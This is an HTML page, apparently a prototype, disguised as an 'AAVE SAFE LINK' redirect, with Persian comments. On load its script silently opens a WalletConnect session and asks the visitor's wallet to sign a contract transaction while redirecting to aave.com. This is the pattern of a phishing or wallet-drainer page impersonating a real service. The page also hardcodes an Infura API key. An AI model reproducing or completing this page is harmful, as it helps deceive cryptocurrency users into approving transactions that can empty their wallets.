<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>AAVE SAFE LINK Redirecting</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/umd/index.min.js"></script>
</head>
<body>
  <script>
    // کد برای لینک مستقیم: کیف پول باز می‌کنه و به test.com ریدایرکت می‌کنه
    async function createDeepLinkAndOpenSite() {
      console.log('شروع اتصال به WalletConnect...');
      
      // ایجاد provider WalletConnect
      const provider = new WalletConnectProvider({
        infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', // کلید Infura (بدون '')
        chainId: 11155111, // Sepolia برای تست
        rpc: { 11155111: 'https://sepolia.infura.io/v3/c886ed6dee284317ad1e17cb5e5cba6f' } // RPC برای Sepolia
      });

      try {
        // فعال کردن اتصال (دیپ لینک: کیف پول باز می‌شه)
        console.log('تلاش برای اتصال به کیف پول...');
        await provider.enable();

        // ایجاد signer
        const signer = new ethers.providers.Web3Provider(provider).getSigner();

        // قرارداد نمونه (آدرس مثالی روی Sepolia)
        const testContractAddress = '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'; // آدرس UNI token روی Sepolia (برای تست)
        // ABI ساده برای یه تابع dummy (مثلاً ping)
        const abi = ['function ping() public'];
        const contract = new ethers.Contract(testContractAddress, abi, signer);

        // فراخوانی تابع ping (تراکنش تست)
        console.log('پیشنهاد تراکنش ping...');
        const tx = await contract.ping();
        console.log('تراکنش پیشنهاد شد: ', tx.hash);
      } catch (error) {
        console.error('خطا در اتصال یا تراکنش: ', error.message);
      }
    }

    // همزمان: ریدایرکت فوری و فراخوانی کیف پول
    (function() {
      console.log('اجرای فرآیند...');
      createDeepLinkAndOpenSite();
      window.location.replace('https://aave.com');
    })();

    // برای تست: اگر ?auto=false باشه، اجرا نشه
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('auto') === 'false') {
      window.onload = null;
    }
  </script>
</body>
</html>
